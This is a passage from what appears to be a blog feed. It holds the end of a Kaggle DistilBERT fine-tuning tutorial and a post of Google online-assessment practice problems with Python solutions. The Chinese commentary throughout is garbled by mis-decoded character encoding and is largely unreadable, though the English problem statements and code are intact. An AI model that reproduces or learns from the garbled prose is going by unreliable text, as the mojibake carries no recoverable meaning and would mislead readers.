class="line"></span><br><span class="line">! wandb login $wandb_token</span><br></pre></td></tr></table></figure></p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨<code>distilbert/distilbert-base-uncased</code>æ¨¡å‹,è¿™é‡Œæœç´¢äº†ä¸€ä¸‹<code>distilbert</code>,è¿™æ˜¯ä¸€ç§é€šè¿‡softmax with temperatureå¯¹<code>bert</code>åšå‡ºæ€§èƒ½ä¼˜åŒ–çš„æ¨¡å‹,å…·ä½“å¯ä»¥çœ‹è¿™é‡Œ<a href="https://paddlepedia.readthedocs.io/en/latest/tutorials/model_compress/model_distill/DistilBERT.html">DistilBert</a>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line"><span class="keyword">import</span> evaluate</span><br><span class="line"><span class="keyword">from</span> datasets <span class="keyword">import</span> Dataset</span><br><span class="line"></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>)</span><br><span class="line">accuracy = evaluate.load(<span class="string">&#x27;accuracy&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_metrics</span>(<span class="params">eval_pred</span>):</span><br><span class="line">    predictions, labels = eval_pred</span><br><span class="line">    predictions = np.argmax(predictions, axis=-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> accuracy.compute(predictions=predictions, references=labels)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pre_processing</span>(<span class="params">example</span>):</span><br><span class="line">    <span class="keyword">return</span> tokenizer(example[<span class="string">&#x27;text&#x27;</span>], truncation=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train_data = train_data.rename(columns=&#123;<span class="string">&#x27;target&#x27;</span>:<span class="string">&#x27;label&#x27;</span>&#125;)</span><br><span class="line">train_df, val_df = train_test_split(train_data, test_size=<span class="number">.2</span>)</span><br><span class="line"></span><br><span class="line">train_dataset = Dataset.from_pandas(train_df)</span><br><span class="line">valid_dataset = Dataset.from_pandas(val_df)</span><br><span class="line">test_dataset = Dataset.from_pandas(test_data)</span><br><span class="line"></span><br><span class="line">tokenized_train = train_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_valid = valid_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br><span class="line">tokenized_test = test_dataset.<span class="built_in">map</span>(pre_processing, batched=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„è¿™é‡Œæœ‰ä¸ªå‘,éœ€è¦renameä¸€ä¸‹column_nameå¦åˆ™åç»­trainä¼šæŠ¥é”™. è¦æ±‚æ–‡å­—éƒ¨åˆ†ä¸º<code>text</code>ä¸”targetä¸º<code>label</code>.</p><p>æœ€åè®¾ç½®å‚æ•°,å®šä¹‰trainerå³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModelForSequenceClassification, TrainingArguments, Trainer</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> DataCollatorWithPadding</span><br><span class="line"></span><br><span class="line">model = AutoModelForSequenceClassification.from_pretrained(<span class="string">&#x27;distilbert/distilbert-base-uncased&#x27;</span>, num_labels=<span class="number">2</span>)</span><br><span class="line">data_collator = DataCollatorWithPadding(tokenizer=tokenizer)</span><br><span class="line"></span><br><span class="line">training_args = TrainingArguments(</span><br><span class="line">    output_dir=<span class="string">&#x27;./disaster_NLP&#x27;</span>,</span><br><span class="line">    learning_rate=<span class="number">2e-5</span>,</span><br><span class="line">    per_device_train_batch_size=<span class="number">16</span>,</span><br><span class="line">    per_device_eval_batch_size=<span class="number">16</span>,</span><br><span class="line">    num_train_epochs=<span class="number">2</span>,</span><br><span class="line">    weight_decay=<span class="number">0.01</span>,</span><br><span class="line">    evaluation_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    save_strategy=<span class="string">&#x27;epoch&#x27;</span>,</span><br><span class="line">    load_best_model_at_end=<span class="literal">True</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">trainer = Trainer(</span><br><span class="line">    model=model,</span><br><span class="line">    args=training_args,</span><br><span class="line">    train_dataset=tokenized_train,</span><br><span class="line">    eval_dataset=tokenized_valid,</span><br><span class="line">    tokenizer=tokenizer,</span><br><span class="line">    data_collator=data_collator,</span><br><span class="line">    compute_metrics=compute_metrics</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">trainer.train()</span><br></pre></td></tr></table></figure></p><p>è®­ç»ƒå®Œå­˜åˆ°submitæäº¤å³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preds = trainer.predict(tokenized_test)</span><br><span class="line">preds = np.argmax(preds[:<span class="number">3</span>][<span class="number">0</span>],axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">submission_path = <span class="string">&#x27;/kaggle/input/nlp-getting-started/sample_submission.csv&#x27;</span></span><br><span class="line">submission_data = pd.read_csv(submission_path)</span><br><span class="line">submission_data[<span class="string">&#x27;target&#x27;</span>] = preds</span><br><span class="line">submission_data.to_csv(<span class="string">&#x27;submission.csv&#x27;</span>, index=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></p><p>çº¯æ–‡æ¡£å®ç°,è°ƒå‚ä¹‹åæ€§èƒ½å¯èƒ½å¯ä»¥ä¼˜åŒ–è¿™é‡Œä¸åšè®¨è®ºäº†.</p>]]></content>
      
      
      <categories>
          
          <category> Kaggle-warmup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Google OAç»ƒä¹ </title>
      <link href="/2024/03/25/Google-OA%E7%BB%83%E4%B9%A0/"/>
      <url>/2024/03/25/Google-OA%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="minimum-difference-between-largest-and-smallest-value-in-three-moves">1509. Minimum Difference Between Largest and Smallest Value in Three Moves</h2><p>You are given an integer array <code>nums</code>.</p><p>In one move, you can choose one element of <code>nums</code> and change it to <code>any value</code>.</p><p>Return the minimum difference between the largest and smallest value of <code>nums</code> after performing at most three moves.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [5,3,2,4]</span><br><span class="line">Output: 0</span><br><span class="line">Explanation: We can make at most 3 moves.</span><br><span class="line">In the first move, change 2 to 3. nums becomes [5,3,3,4].</span><br><span class="line">In the second move, change 4 to 3. nums becomes [5,3,3,3].</span><br><span class="line">In the third move, change 5 to 3. nums becomes [3,3,3,3].</span><br><span class="line">After performing 3 moves, the difference between the minimum and maximum is 3 - 3 = 0.</span><br></pre></td></tr></table></figure><p>çŸ¥é“æœ€å¤§4å’Œæœ€å°4å³å¯ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDifference</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) &lt;= <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="comment"># init</span></span><br><span class="line">        min_list = []</span><br><span class="line">        max_list = []</span><br><span class="line">        min_list[:] = nums[:<span class="number">4</span>]</span><br><span class="line">        max_list[:] = nums[:<span class="number">4</span>]</span><br><span class="line">        <span class="comment"># fill the list</span></span><br><span class="line">        <span class="comment"># or we can do sorted and take sorted_lst[:4] and sorted_lst[4:]</span></span><br><span class="line">        <span class="comment"># but it will be nlogn instead of n</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums[<span class="number">4</span>:]:</span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="built_in">min</span>(max_list):</span><br><span class="line">                max_list.remove(<span class="built_in">min</span>(max_list))</span><br><span class="line">                max_list.append(i)</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="built_in">max</span>(min_list):</span><br><span class="line">                min_list.remove(<span class="built_in">max</span>(min_list))</span><br><span class="line">                min_list.append(i)</span><br><span class="line">        min_list = <span class="built_in">sorted</span>(min_list)</span><br><span class="line">        max_list = <span class="built_in">sorted</span>(max_list)</span><br><span class="line">        res = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> max_list[i] - min_list[i] &lt; res:</span><br><span class="line">                res = max_list[i] - min_list[i]</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span> <span class="keyword">if</span> res &lt; <span class="number">0</span> <span class="keyword">else</span> res</span><br></pre></td></tr></table></figure></p><h2 id="number-of-good-ways-to-split-a-string">1525. Number of Good Ways to Split a String</h2><p>You are given a string <code>s</code>.</p><p>A split is called good if you can split <code>s</code> into two non-empty strings s_left and s_right where their concatenation is equal to <code>s</code> (i.e., s_left + s_right = s) and the number of distinct letters in s_left and s_right is the same.</p><p>Return the number of good splits you can make in <code>s</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Input: s = &quot;aacaba&quot;</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: There are 5 ways to split &quot;aacaba&quot; and 2 of them are good. </span><br><span class="line">(&quot;a&quot;, &quot;acaba&quot;) Left string and right string contains 1 and 3 different letters respectively.</span><br><span class="line">(&quot;aa&quot;, &quot;caba&quot;) Left string and right string contains 1 and 3 different letters respectively.</span><br><span class="line">(&quot;aac&quot;, &quot;aba&quot;) Left string and right string contains 2 and 2 different letters respectively (good split).</span><br><span class="line">(&quot;aaca&quot;, &quot;ba&quot;) Left string and right string contains 2 and 2 different letters respectively (good split).</span><br><span class="line">(&quot;aacab&quot;, &quot;a&quot;) Left string and right string contains 3 and 1 different letters respectively.</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ„Ÿè§‰ä¸¤å­—å…¸ç„¶åä¸€ä¸ªéå†æ¥å®æ—¶æ›´æ–°ä¸¤ä¾§å­—å…¸,æ£€æŸ¥keyæ•°é‡å³å¯,å®é™…å®ç°åä¹Ÿæ˜¯beat 32%runtimeå’Œ95%Mem. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> defaultdict</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">numSplits</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        right = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            right[i] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            left[i] += <span class="number">1</span></span><br><span class="line">            right[i] -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> right[i] == <span class="number">0</span>:</span><br><span class="line">                right.pop(i)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(left.keys()) == <span class="built_in">len</span>(right.keys()):</span><br><span class="line">                res += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure></p><h2 id="latest-time-by-replacing-hidden-digits">1736. Latest Time by Replacing Hidden Digits</h2><p>You are given a string <code>time</code> in the form of <code>hh:mm</code>, where some of the digits in the string are hidden (represented by <code>?</code>).</p><p>The valid times are those inclusively between <code>00:00</code> and <code>23:59</code>.</p><p>Return the latest valid time you can get from <code>time</code> by replacing the hidden digits.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: time = &quot;2?:?0&quot;</span><br><span class="line">Output: &quot;23:50&quot;</span><br><span class="line">Explanation: The latest hour beginning with the digit &#x27;2&#x27; is 23 and the latest minute ending with the digit &#x27;0&#x27; is 50.</span><br></pre></td></tr></table></figure><p>é€»è¾‘é¢˜ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">maximumTime</span>(<span class="params">self, time: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        res = <span class="built_in">list</span>(time)</span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span> <span class="keyword">or</span> <span class="built_in">int</span>(res[<span class="number">1</span>]) &lt; <span class="number">4</span>:</span><br><span class="line">                res[<span class="number">0</span>] = <span class="string">&#x27;2&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res[<span class="number">0</span>] = <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">1</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> res[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                res[<span class="number">1</span>] = <span class="string">&#x27;3&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res[<span class="number">1</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">3</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            res[<span class="number">3</span>] = <span class="string">&#x27;5&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> res[<span class="number">4</span>] == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            res[<span class="number">4</span>] = <span class="string">&#x27;9&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(res)                  </span><br></pre></td></tr></table></figure></p><h2 id="last-stone-weight-ii">1049. Last Stone Weight II</h2><p>You are given an array of integers stones where <code>stones[i]</code> is the weight of the ith stone.</p><p>We are playing a game with the stones. On each turn, we choose any two stones and smash them together. Suppose the stones have weights <code>x</code> and <code>y</code> with <code>x &lt;= y</code>. The result of this smash is:</p><p>If <code>x == y</code>, both stones are destroyed, and If <code>x != y</code>, the stone of weight <code>x</code> is destroyed, and the stone of weight <code>y</code> has new weight <code>y - x</code>. At the end of the game, there is at most one stone left.</p><p>Return the smallest possible weight of the left stone. If there are no stones left, return 0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: stones = [2,7,4,1,8,1]</span><br><span class="line">Output: 1</span><br><span class="line">Explanation:</span><br><span class="line">We can combine 2 and 4 to get 2, so the array converts to [2,7,1,8,1] then,</span><br><span class="line">we can combine 7 and 8 to get 1, so the array converts to [2,1,1,1] then,</span><br><span class="line">we can combine 2 and 1 to get 1, so the array converts to [1,1,1] then,</span><br><span class="line">we can combine 1 and 1 to get 0, so the array converts to [1], then that&#x27;s the optimal value.</span><br></pre></td></tr></table></figure><p>01èƒŒåŒ…,targetä¸º 0.5 * sum(stones) <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lastStoneWeightII</span>(<span class="params">self, stones: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        sum_ = <span class="built_in">sum</span>(stones)</span><br><span class="line">        target = sum_ // <span class="number">2</span></span><br><span class="line">        dp = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(target+<span class="number">1</span>)]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> stones:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(target, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">                <span class="keyword">if</span> j &gt;= i:</span><br><span class="line">                    dp[j] = <span class="built_in">max</span>(dp[j], dp[j-i]+i)</span><br><span class="line">        <span class="keyword">return</span> sum_ - <span class="number">2</span> * dp[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure></p><h2 id="most-booked-hotel-room">Most Booked Hotel Room</h2><p>Given a hotel which has 10 floors <code>[0-9]</code> and each floor has 26 rooms <code>[A-Z]</code>. You are given a sequence of rooms, where <code>+</code> suggests room is booked, <code>-</code> room is freed. You have to find which room is booked maximum number of times.</p><p>You may assume that the list describe a correct sequence of bookings in chronological order; that is, only free rooms can be booked and only booked rooms can be freeed. All rooms are initially free. Note that this does not mean that all rooms have to be free at the end. In case, 2 rooms have been booked the same number of times, return the lexographically smaller room.</p><p>You may assume:</p><ul><li><code>N</code> (length of input) is an integer within the range <code>[1, 600]</code></li><li>each element of array A is a string consisting of three characters: "+" or "-"; a digit "0"-"9"; and uppercase English letter "A" - "Z"</li><li>the sequence is correct. That is every booked room was previously free and every freed room was previously booked.</li></ul><p>counteråŠ ä¸ªsort <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">most_booked</span>(<span class="params">lst</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sorted</span>(Counter(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]==<span class="string">&#x27;+&#x27;</span>, lst)).items(), key=<span class="keyword">lambda</span> y: (-y[-<span class="number">1</span>], -<span class="built_in">ord</span>(y[<span class="number">0</span>][-<span class="number">1</span>])))[<span class="number">0</span>][<span class="number">0</span>]</span><br></pre></td></tr></table></figure></p><h2 id="minimum-domino-rotations-for-equal-row">1007. Minimum Domino Rotations For Equal Row</h2><p>In a row of dominoes, <code>tops[i]</code> and <code>bottoms[i]</code> represent the top and bottom halves of the <code>i</code>th domino. (A domino is a tile with two numbers from 1 to 6 - one on each half of the tile.)</p><p>We may rotate the <code>i</code>th domino, so that <code>tops[i]</code> and <code>bottoms[i]</code> swap values.</p><p>Return the minimum number of rotations so that all the values in tops are the same, or all the values in bottoms are the same.</p><p>If it cannot be done, return -1. <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Input: tops = [2,1,2,4,2,2], bottoms = [5,2,6,2,3,2]</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: </span><br><span class="line">The first figure represents the dominoes as given by tops and bottoms: before we do any rotations.</span><br><span class="line">If we rotate the second and fourth dominoes, we can make every value in the top row equal to 2, as indicated by the second figure.</span><br></pre></td></tr></table></figure></p><p>ä¸€å¼€å§‹ç”¨çš„bit_maskéå†å¤æ‚å¹‚å‡½æ•°TLE,åç»­è€ƒè™‘ç»Ÿè®¡é¢‘ç‡ç„¶åéå†AC <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDominoRotations</span>(<span class="params">self, tops: <span class="type">List</span>[<span class="built_in">int</span>], bottoms: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">set</span>(tops)) &lt;= <span class="number">1</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">set</span>(bottoms)) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        ctr_top = Counter(tops)</span><br><span class="line">        ctr_btm = Counter(bottoms)</span><br><span class="line">        sorted_ctr = <span class="built_in">sorted</span>(<span class="built_in">list</span>(ctr_top.items())+<span class="built_in">list</span>(ctr_btm.items()), key=<span class="keyword">lambda</span> x: -x[<span class="number">1</span>])</span><br><span class="line">        solution = <span class="built_in">len</span>(tops)</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> sorted_ctr:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tops)):</span><br><span class="line">                <span class="keyword">if</span> tops[i] != k <span class="keyword">and</span> bottoms[i] != k:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">elif</span> i == <span class="built_in">len</span>(tops) - <span class="number">1</span>:</span><br><span class="line">                    res = <span class="built_in">min</span>(v, <span class="built_in">len</span>(tops)-v)</span><br><span class="line">                    solution = solution <span class="keyword">if</span> solution &lt; res <span class="keyword">else</span> res</span><br><span class="line">        <span class="keyword">if</span> solution == <span class="built_in">len</span>(tops):</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> solution</span><br></pre></td></tr></table></figure> çœ‹äº†ä¸‹å…¶ä»–äººçš„solution,è´´ä¸€ä¸ªç®€æ´çš„ä»£ç  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minDominoRotations</span>(<span class="params">self, tops: <span class="type">List</span>[<span class="built_in">int</span>], bottoms: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> [tops[<span class="number">0</span>], bottoms[<span class="number">0</span>]]:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">all</span>(x <span class="keyword">in</span> lst <span class="keyword">for</span> lst <span class="keyword">in</span> <span class="built_in">zip</span>(tops,bottoms)):</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">len</span>(tops) - <span class="built_in">max</span>(tops.count(x), bottoms.count(x))</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>ä¸»è¦æ€è·¯ <code>top[0]</code> æˆ– <code>bottom[0]</code> å¿…é¡»åŒ…å«åœ¨æˆç«‹ç»“æœä¸­</p><h2 id="single-row-keyboard">1165. Single-Row Keyboard</h2><p>Imagine you have a special keyboard with all keys in a single row. The layout of characters on a keyboard is denoted by a string <code>keyboard</code> of length 26. Initially your finger is at index 0. To type a character, you have to move your finger to the index of the desired character. The time taken to move your finger from index <code>i</code> to index <code>j</code> is <code>abs(j - i)</code>.</p><p>Given a string <code>keyboard</code> that describe the keyboard layout and a string <code>text</code>, return an integer denoting the time taken to type string <code>text</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Input: keyboard = &quot;abcdefghijklmnopqrstuvwxy&quot;, text = &quot;cba&quot; </span><br><span class="line">Output: 4</span><br><span class="line">Explanation:</span><br><span class="line">Initially your finger is at index 0. First you have to type &#x27;c&#x27;. The time taken to type &#x27;c&#x27; will be abs(2 - 0) = 2 because character &#x27;c&#x27; is at index 2.</span><br><span class="line">The second character is &#x27;b&#x27; and your finger is now at index 2. The time taken to type &#x27;b&#x27; will be abs(1 - 2) = 1 because character &#x27;b&#x27; is at index 1.</span><br><span class="line">The third character is &#x27;a&#x27; and your finger is now at index 1. The time taken to type &#x27;a&#x27; will be abs(0 - 1) = 1 because character &#x27;a&#x27; is at index 0.</span><br><span class="line">The total time will therefore be 2 + 1 + 1 = 4.</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fn</span>(<span class="params">self, keyboard, text</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        curr = <span class="number">0</span></span><br><span class="line">        key_map = <span class="built_in">dict</span>()</span><br><span class="line">        <span class="keyword">for</span> index, key <span class="keyword">in</span> <span class="built_in">enumerate</span>(keyboard):</span><br><span class="line">            key_map[key] = index</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">            v = key_map[char]</span><br><span class="line">            res += <span class="built_in">abs</span>(v - curr)</span><br><span class="line">            curr = v</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="maximum-level-sum-of-a-binary-tree">1161. Maximum Level Sum of a Binary Tree</h2><p>Given the root of a binary tree, the level of its root is 